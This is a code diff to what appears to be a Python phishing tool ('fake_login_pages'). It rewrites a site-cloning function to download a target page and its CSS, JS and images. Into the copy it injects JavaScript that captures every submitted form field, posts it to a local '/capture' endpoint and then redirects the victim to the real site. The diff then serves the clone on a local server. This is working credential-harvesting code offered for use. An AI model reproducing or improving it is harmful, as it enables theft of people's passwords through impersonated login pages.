@@ -7,12 +7,11 @@ import numlookupapi
 import time
 import webbrowser
 import requests
-import urllib.parse as urlparse
+import urllib.parse
 import time
 import json
 import email
 import email.policy
-import wget
 from io import BytesIO
 from bs4 import BeautifulSoup
 from colorama import init, Fore, Style
@@ -252,6 +251,15 @@ def fake_login_pages(language):
 
     clone_website(url, server_choice, language)
 
+def download_resource(url, base_url, save_path):
+    try:
+        response = requests.get(url)
+        if response.status_code == 200:
+            with open(save_path, 'wb') as file:
+                file.write(response.content)
+    except Exception as e:
+        print(f"Error downloading {url}: {e}")
+
 def clone_website(url, server_choice, language):
     clear_console()
     if language == '1':
@@ -264,54 +272,82 @@ def clone_website(url, server_choice, language):
         clone_dir = 'cloned_site'
         os.makedirs(clone_dir, exist_ok=True)
 
-        # Usando wget para baixar todo o conteúdo do site
-        wget.download(url, clone_dir, bar=None)
+        # Baixar o HTML
+        response = requests.get(url)
+        if response.status_code == 200:
+            soup = BeautifulSoup(response.text, 'html.parser')
 
-        # Inject the capture script into the cloned HTML
-        index_file_path = os.path.join(clone_dir, 'index.html')
-        with open(index_file_path, 'r', encoding='utf-8') as file:
-            soup = BeautifulSoup(file, 'html.parser')
+            # Salvar HTML
+            html_file_path = os.path.join(clone_dir, 'index.html')
+            with open(html_file_path, 'w', encoding='utf-8') as file:
+                file.write(soup.prettify())
 
-        script = """
-        <script>
-            document.forms[0].addEventListener('submit', function(event) {
-                event.preventDefault();
-                var form = event.target;
-                var formData = new FormData(form);
-                var xhr = new XMLHttpRequest();
-                xhr.open('POST', '/capture');
-                xhr.setRequestHeader('Content-Type', 'application/json');
-                xhr.onload = function() {
-                    window.location = '""" + url + """';
-                };
-                var object = {};
-                formData.forEach((value, key) => object[key] = value);
-                xhr.send(JSON.stringify(object));
-            });
-        </script>
-        """
+            # Encontrar e baixar recursos adicionais
+            resources = []
 
-        if soup.body:
-            soup.body.append(BeautifulSoup(script, 'html.parser'))
-        elif soup.head:
-            soup.head.append(BeautifulSoup(script, 'html.parser'))
-        else:
-            # Adiciona a tag <head> se não existir
-            head_tag = soup.new_tag('head')
-            soup.insert(0, head_tag)
-            head_tag.append(BeautifulSoup(script, 'html.parser'))
+            # Baixar CSS
+            for link in soup.find_all('link', href=True):
+                if 'stylesheet' in link.get('rel', []):
+                    resource_url = urllib.parse.urljoin(url, link['href'])
+                    resources.append(resource_url)
+                    download_resource(resource_url, url, os.path.join(clone_dir, os.path.basename(link['href'])))
 
-        html_content = soup.prettify()
+            # Baixar JS
+            for script in soup.find_all('script', src=True):
+                resource_url = urllib.parse.urljoin(url, script['src'])
+                resources.append(resource_url)
+                download_resource(resource_url, url, os.path.join(clone_dir, os.path.basename(script['src'])))
 
-        # Salvar o HTML modificado localmente
-        with open(index_file_path, 'w', encoding='utf-8') as file:
-            file.write(html_content)
+            # Baixar Imagens
+            for img in soup.find_all('img', src=True):
+                resource_url = urllib.parse.urljoin(url, img['src'])
+                resources.append(resource_url)
+                download_resource(resource_url, url, os.path.join(clone_dir, os.path.basename(img['src'])))
 
-        print("Site cloned successfully!")
+            # Inject the capture script into the cloned HTML
+            with open(html_file_path, 'r', encoding='utf-8') as file:
+                soup = BeautifulSoup(file, 'html.parser')
 
-        # Continuar com a execução no servidor selecionado (apenas localhost implementado)
-        if server_choice == '1':
-            run_local_server(clone_dir, url, language)
+            script = """
+            <script>
+                document.forms[0].addEventListener('submit', function(event) {
+                    event.preventDefault();
+                    var form = event.target;
+                    var formData = new FormData(form);
+                    var xhr = new XMLHttpRequest();
+                    xhr.open('POST', '/capture');
+                    xhr.setRequestHeader('Content-Type', 'application/json');
+                    xhr.onload = function() {
+                        window.location = '""" + url + """';
+                    };
+                    var object = {};
+                    formData.forEach((value, key) => object[key] = value);
+                    xhr.send(JSON.stringify(object));
+                });
+            </script>
+            """
+
+            if soup.body:
+                soup.body.append(BeautifulSoup(script, 'html.parser'))
+            elif soup.head:
+                soup.head.append(BeautifulSoup(script, 'html.parser'))
+            else:
+                # Adiciona a tag <head> se não existir
+                head_tag = soup.new_tag('head')
+                soup.insert(0, head_tag)
+                head_tag.append(BeautifulSoup(script, 'html.parser'))
+
+            html_content = soup.prettify()
+
+            # Salvar o HTML modificado localmente
+            with open(html_file_path, 'w', encoding='utf-8') as file:
+                file.write(html_content)
+
+            print("Site cloned successfully!")
+
+            # Continuar com a execução no servidor selecionado (apenas localhost implementado)
+            if server_choice == '1':
+                run_local_server(clone_dir, url, language)
 
     except Exception as e:
         print(f"Error cloning website: {e}")
